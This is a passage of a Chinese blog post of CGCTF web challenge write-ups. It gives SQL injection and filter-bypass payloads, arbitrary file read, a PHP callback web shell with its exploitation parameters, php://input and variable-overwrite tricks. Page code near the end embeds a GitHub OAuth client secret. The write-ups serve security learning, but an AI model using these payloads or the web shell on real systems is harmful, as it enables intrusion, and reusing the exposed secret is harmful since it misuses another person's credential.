+<pre><code>SELECT * FROM users WHERE name=&#39;.$username.&#39; AND pass=&#39;.$password.&#39;
+</code></pre>
+<p>因为被转义了单引号，所以这里不能用闭合的思路去做。架设get_magic_quotes_gpc()返回false，那么我们可以通过传入反斜杠来吃掉一个单引号，构造语句</p>
+<pre><code>?username=\&amp;password=||1%23
+</code></pre>
+<p>得到flag</p>
+<h1 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h1><p>打开屏幕，满屏的jsfuck代码，复制到控制台执行，得到一个网页1bc29b36f623ba82aaf6724fd3b16718.php <br /><br>访问这个页面，提示tip在我脑袋里，猜测tip是在响应头中 <br /><br>bp抓包，果然在响应头中有个tip：history of bash <br /><br>到这里我卡了很久，因为不知道这个history of bash到底是什么玩意，度娘告诉我是linux的命令，但是在这里估计不是这个意思 <br /><br>看了wp之后才知道意思是.bash_history文件，访问这个文件，发现压缩命令以及flagbak.zip，访问这个文件即可得到flag</p>
+<h1 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h1><p>又是点击就送的源码</p>
+<pre><code>&lt;?php
+if($_POST[user] &amp;&amp; $_POST[pass]) &#123;
+   mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
+  mysql_select_db(SAE_MYSQL_DB);
+  $user = $_POST[user];
+  $pass = md5($_POST[pass]);
+  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#39;$user&#39;&quot;));
+  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;
+      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;
+  &#125;
+  else &#123;
+    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);
+  &#125;
+&#125;
+?&gt;
+</code></pre>
+<p>源码的意思是，将输入的user放入查询语句中查询，数据库中的ctf表中应该是事先将user的密码经过md5计算，之后再把输入的pass经过md5计算之后，和查询语句的结果进行对比，相同则通过验证 <br /><br>构建语句 <br /></p>
+<pre><code>[POST DATA]
+user=&#39; union select md5(1)#&amp;pass=1
+</code></pre>
+<p>根据union的特性，因为前面是查不到东西的，所以sql查询语句返回的值为md5(1)，即可达到绕过</p>
+<h1 id="综合题2"><a href="#综合题2" class="headerlink" title="综合题2"></a>综合题2</h1><p>很有意思的一道题，更偏向于真实的渗透环境 <br /><br>首先先右键源代码，渗透第一步，收集信息。可以在index的源代码中找到so.php、preview.php、sm.txt这些页面，值得注意的是，源代码中有一个href标签链接到about.php?file&#x3D;sm.txt，点开之后发现是任意文件读取漏洞，可以利用about.php读取所有的源码 <br /><br>读取sm.txt之后，又发现了config.php、passencode.php、say.php文件，利用任意文件读取漏洞来读取这些页面的源代码。在审计源码的过程中，还发现了antiinject.php、antixss.php两个页面，看名字也知道，这两个页面是用来防御sql注入以及xss攻击的 <br /><br>审计源码的过程中发现一直在提示不是xss的，antixss.php中也没看出什么可以绕过的地方，倒是antiinject.php，过滤了一些关键词，但是函数本身可以双写绕过 <br /><br>在用读取about.php的源码时，能发现about.php在读取源码的时候过滤了<code>loginxlcteam</code>目录和config.php，<code>loginxlcteam</code>与其说是文件，更像是一个目录，访问<code>loginxlcteam</code>，发现了管理员后台登录系统。 <br /><br>试了一下，发现好像无法注入，且被about过滤也没办法读取源码 <br /><br>接下来的思路就很清晰了，想办法拿到管理员账户。而在上一步审计源码的过程中，我们发现了so.php是可以注入的，回到so.php尝试注入 <br /><br>需要注意的是，如果直接访问so.php是无法注入的，config.php应该有检测referer的手段，必须从index.php底下的搜索留言那里注入。另外，提示也直接给出了admin的表的结构，省去了注入的一大堆步骤 <br /></p>
+<pre><code>soid=-1/**/uniunionon/**/selecselectt/**/1,usernamnamee,3,4/**/from/**/admiadminn //得到用户名
+soid=-1/**/uniunionon/**/selecselectt/**/1,userpaspasss,3,4/**/from/**/admiadminn //得到密码
+</code></pre>
+<p>表中只有一条数据，admin和密码，密码注出来的结果是102 117 99 107 114 117 110 116 117，在passencode.php中我们能发现，密码加密的算法实际上就是把密码转为ascii值存储，用ascii对照表一对照就可以得到密码 <br /><br>进入后台之后，提示在根目录下有写好的木马文件xlcteam.php，利用about读出源码</p>
+<pre><code>&lt;?php $e = $_REQUEST[&#39;www&#39;]; $arr = array($_POST[&#39;wtf&#39;] =&gt; &#39;|.*|e&#39;,); array_walk($arr, $e, &#39;&#39;); ?&gt;
+</code></pre>
+<p>三个参数的回调木马，自己试了一下，怎么也执行不了，看了大佬的wp才知道利用方法 </p>
+<pre><code>[POST DATA]
+www=preg_replace&amp;wtf=print_r(scandir(&quot;./&quot;))
+</code></pre>
+<p>读取根目录下的所有文件，转换一下编码，发现flag文件，打开即获得flag</p>
+<h1 id="密码重置2"><a href="#密码重置2" class="headerlink" title="密码重置2"></a>密码重置2</h1><h1 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h1><p>右键查看源代码</p>
+<pre><code>&lt;!--$file = $_GET[&#39;file&#39;];
+if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123;
+    echo $nctf;
+&#125;--&gt;
+</code></pre>
+<p>看到file_get_contents函数，下意识想到php伪协议 <br /><br>用hackbar输入</p>
+<pre><code>url?file=php://input
+[POSTDATA]  meizijiu
+</code></pre>
+<p>获得flag</p>
+<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p>右键查看源代码 </p>
+<pre><code>&lt;!--foreach($_GET as $key =&gt; $value)&#123;  
+        $$key = $value;  
+&#125;  
+if($name == &quot;meizijiu233&quot;)&#123;
+    echo $flag;
+&#125;--&gt;
+</code></pre>
+<p>foreach函数存在变量覆盖漏洞，输入??name&#x3D;meizijiu233即可</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://perfect-time.xyz">LINK</a>
+            <p>原文链接: <a href="https://perfect-time.xyz/2018/10/26/CGCTF-wp/">https://perfect-time.xyz/2018/10/26/CGCTF-wp/</a>
+            <p>发表日期: <a href="https://perfect-time.xyz/2018/10/26/CGCTF-wp/">October 26th 2018, 8:11:05 pm</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/12/06/geeksycsec/" title= 极客大挑战第⑨季-web-wp >
+                    <div class="nextTitle">极客大挑战第⑨季-web-wp</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/10/22/bugku-wp/" title= bugku-web-wp >
+                    <div class="prevTitle">bugku-web-wp</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+<div id="container"></div>
+<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+        // id: "cgctf-web-wp", // 可选。默认为 location.href
+        owner: 'a1055883471',
+        repo: 'a1055883471.github.io',
+        oauth: {
+            client_id: '4514a03a15dc92fbdd90',
+            client_secret: 'cdffbd6889428a82f7232c85f4ccd95cf70b2211',
+        },
+    })
+    gitment.render('container')
+
+</script>
+
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=gPf3966ytbewsMDx8a7j7_0" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/a1055883471" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/assets/qrcode_1530688616677.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#md5-collision"><span class="toc-number">2.</span> <span class="toc-text">md5 collision</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AD%BE%E5%88%B02"><span class="toc-number">3.</span> <span class="toc-text">签到2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%99%E9%A2%98%E4%B8%8D%E6%98%AFweb"><span class="toc-number">4.</span> <span class="toc-text">这题不是web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B1%82%E5%B1%82%E9%80%92%E8%BF%9B"><span class="toc-number">5.</span> <span class="toc-text">层层递进</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AAencode"><span class="toc-number">6.</span> <span class="toc-text">AAencode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%95%E8%BA%AB%E4%BA%8C%E5%8D%81%E5%B9%B4"><span class="toc-number">7.</span> <span class="toc-text">单身二十年</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-decode"><span class="toc-number">8.</span> <span class="toc-text">php decode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="toc-number">9.</span> <span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%95%E8%BA%AB%E4%B8%80%E7%99%BE%E5%B9%B4%E4%B9%9F%E6%B2%A1%E7%94%A8"><span class="toc-number">10.</span> <span class="toc-text">单身一百年也没用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#COOKIE"><span class="toc-number">11.</span> <span class="toc-text">COOKIE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL"><span class="toc-number">12.</span> <span class="toc-text">MYSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GBK-Injection"><span class="toc-number">13.</span> <span class="toc-text">GBK Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x00"><span class="toc-number">14.</span> <span class="toc-text">&#x2F;x00</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bypass-again"><span class="toc-number">15.</span> <span class="toc-text">bypass again</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">16.</span> <span class="toc-text">上传绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A51"><span class="toc-number">17.</span> <span class="toc-text">sql注入1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pass-check"><span class="toc-number">18.</span> <span class="toc-text">pass check</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B5%B7%E5%90%8D%E5%AD%97%E7%9C%9F%E9%9A%BE"><span class="toc-number">19.</span> <span class="toc-text">起名字真难</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">20.</span> <span class="toc-text">密码重置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">21.</span> <span class="toc-text">php反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">22.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E9%A2%98"><span class="toc-number">23.</span> <span class="toc-text">综合题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A52"><span class="toc-number">24.</span> <span class="toc-text">SQL注入2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E9%A2%982"><span class="toc-number">25.</span> <span class="toc-text">综合题2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE2"><span class="toc-number">26.</span> <span class="toc-text">密码重置2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file-get-contents"><span class="toc-number">27.</span> <span class="toc-text">file_get_contents</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">28.</span> <span class="toc-text">变量覆盖</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 17
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2023 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/10</span><a class="archive-post-title" href= "/2023/08/10/Intranet_attack/" >内网攻防</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span><a class="archive-post-title" href= "/2018/12/06/geeksycsec/" >极客大挑战第⑨季-web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span><a class="archive-post-title" href= "/2018/12/06/shiyan8/" >实验吧-web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2018/10/26/CGCTF-wp/" >cgctf-web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/22</span><a class="archive-post-title" href= "/2018/10/22/bugku-wp/" >bugku-web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span><a class="archive-post-title" href= "/2018/10/18/python-auto-script/" >python自动化脚本学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/2018/10/08/PKIstudy/" >PKI学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/2018/09/07/python/" >python学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/02</span><a class="archive-post-title" href= "/2018/08/02/sql/" >sql注入笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2018/07/29/phpstudy-3/" >php学习笔记-核心编程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/27</span><a class="archive-post-title" href= "/2018/07/27/sqli-labs/" >sqli-libs解题思路-Basic Challenges</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "/2018/07/19/dvwa-low/" >基于DVWA的web漏洞原理-low</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href= "/2018/07/18/phpstudy-1/" >php学习笔记-基础部分</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href= "/2018/07/18/phpstudy-2/" >php中一些比较实用的技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/2018/07/13/dvwa-medium/" >基于DVWA的web漏洞原理-medium</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/2018/07/13/dvwa-high/" >基于DVWA的web漏洞原理-high</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/05</span><a class="archive-post-title" href= "/2018/07/05/problem/" >搭博客过程中遇到的一些问题</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="内网攻防"><span class="iconfont-archer">&#xe606;</span>内网攻防</span>
+    
+        <span class="sidebar-tag-name" data-tags="wp"><span class="iconfont-archer">&#xe606;</span>wp</span>
+    
+        <span class="sidebar-tag-name" data-tags="dvwa"><span class="iconfont-archer">&#xe606;</span>dvwa</span>
+    
+        <span class="sidebar-tag-name" data-tags="PKI"><span class="iconfont-archer">&#xe606;</span>PKI</span>
+    
+        <span class="sidebar-tag-name" data-tags="php学习"><span class="iconfont-archer">&#xe606;</span>php学习</span>
+    
+        <span class="sidebar-tag-name" data-tags="脚本"><span class="iconfont-archer">&#xe606;</span>脚本</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql注入"><span class="iconfont-archer">&#xe606;</span>sql注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="sqli-libs"><span class="iconfont-archer">&#xe606;</span>sqli-libs</span>
+    
+        <span class="sidebar-tag-name" data-tags="python学习"><span class="iconfont-archer">&#xe606;</span>python学习</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
+    
+        <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
+    
+        <span class="sidebar-category-name" data-categories="web安全"><span class="iconfont-archer">&#xe60a;</span>web安全</span>
+    
+        <span class="sidebar-category-name" data-categories="笔记"><span class="iconfont-archer">&#xe60a;</span>笔记</span>
+    
+        <span class="sidebar-category-name" data-categories="其他"><span class="iconfont-archer">&#xe60a;</span>其他</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "LINK"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
